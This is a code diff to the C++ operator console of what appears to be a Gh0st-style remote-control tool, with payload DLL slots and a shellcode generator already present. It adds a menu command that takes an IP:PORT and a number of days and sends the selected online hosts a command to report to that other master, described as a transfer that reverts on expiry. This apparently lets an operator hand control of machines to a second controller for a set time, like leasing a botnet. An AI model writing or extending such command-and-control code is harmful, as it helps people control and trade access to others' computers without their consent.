@@ -303,6 +303,7 @@ CMy2015RemoteDlg::CMy2015RemoteDlg(CWnd* pParent): CDialogEx(CMy2015RemoteDlg::I
 	m_bmOnline[9].LoadBitmap(IDB_BITMAP_SDESKTOP);
 	m_bmOnline[10].LoadBitmap(IDB_BITMAP_AUTHORIZE);
 	m_bmOnline[11].LoadBitmap(IDB_BITMAP_UNAUTH);
+	m_bmOnline[12].LoadBitmap(IDB_BITMAP_ASSIGNTO);
 
 	for (int i = 0; i < PAYLOAD_MAXTYPE; i++) {
 		m_ServerDLL[i] = nullptr;
@@ -418,6 +419,7 @@ BEGIN_MESSAGE_MAP(CMy2015RemoteDlg, CDialogEx)
 	ON_COMMAND(ID_TOOL_REQUEST_AUTH, &CMy2015RemoteDlg::OnToolRequestAuth)
 	ON_COMMAND(ID_TOOL_INPUT_PASSWORD, &CMy2015RemoteDlg::OnToolInputPassword)
 	ON_COMMAND(ID_TOOL_GEN_SHELLCODE, &CMy2015RemoteDlg::OnToolGenShellcode)
+	ON_COMMAND(ID_ONLINE_ASSIGN_TO, &CMy2015RemoteDlg::OnOnlineAssignTo)
 END_MESSAGE_MAP()
 
 
@@ -1278,6 +1280,7 @@ void CMy2015RemoteDlg::OnNMRClickOnline(NMHDR *pNMHDR, LRESULT *pResult)
 	Menu.SetMenuItemBitmaps(ID_ONLINE_H264_DESKTOP, MF_BYCOMMAND, &m_bmOnline[9], &m_bmOnline[9]);
 	Menu.SetMenuItemBitmaps(ID_ONLINE_AUTHORIZE, MF_BYCOMMAND, &m_bmOnline[10], &m_bmOnline[10]);
 	Menu.SetMenuItemBitmaps(ID_ONLINE_UNAUTHORIZE, MF_BYCOMMAND, &m_bmOnline[11], &m_bmOnline[11]);
+	Menu.SetMenuItemBitmaps(ID_ONLINE_ASSIGN_TO, MF_BYCOMMAND, &m_bmOnline[12], &m_bmOnline[12]);
 
 	// 创建一个新的子菜单
 	CMenu newMenu;
@@ -2994,4 +2997,30 @@ void CMy2015RemoteDlg::OnToolGenShellcode()
 		SAFE_DELETE_ARRAY(srcData);
 		SAFE_DELETE_ARRAY(szBuffer);
 	}
+}
+
+
+void CMy2015RemoteDlg::OnOnlineAssignTo()
+{
+	CInputDialog dlg(this);
+	dlg.Init("转移主机(到期自动复原)", "输入<IP:PORT>地址:");
+	dlg.Init2("天数(支持浮点数):", "30");
+	if (dlg.DoModal() != IDOK || dlg.m_str.IsEmpty() || atof(dlg.m_sSecondInput.GetString())<=0)
+		return;
+	if (dlg.m_str.GetLength() >= 250) {
+		MessageBox("字符串长度超出[0, 250]范围限制!", "提示", MB_ICONINFORMATION);
+		return;
+	}
+	if (dlg.m_sSecondInput.GetLength() >= 6) {
+		MessageBox("超出使用时间可输入的字符数限制!", "提示", MB_ICONINFORMATION);
+		return;
+	}
+
+	BYTE bToken[_MAX_PATH] = { COMMAND_ASSIGN_MASTER };
+	// 目标主机类型
+	bToken[1] = SHARE_TYPE_YAMA_FOREVER;
+	memcpy(bToken + 2, dlg.m_str, dlg.m_str.GetLength());
+	bToken[2 + dlg.m_str.GetLength()] = ':';
+	memcpy(bToken + 2 + dlg.m_str.GetLength() + 1, dlg.m_sSecondInput, dlg.m_sSecondInput.GetLength());
+	SendSelectedCommand(bToken, sizeof(bToken));
 }
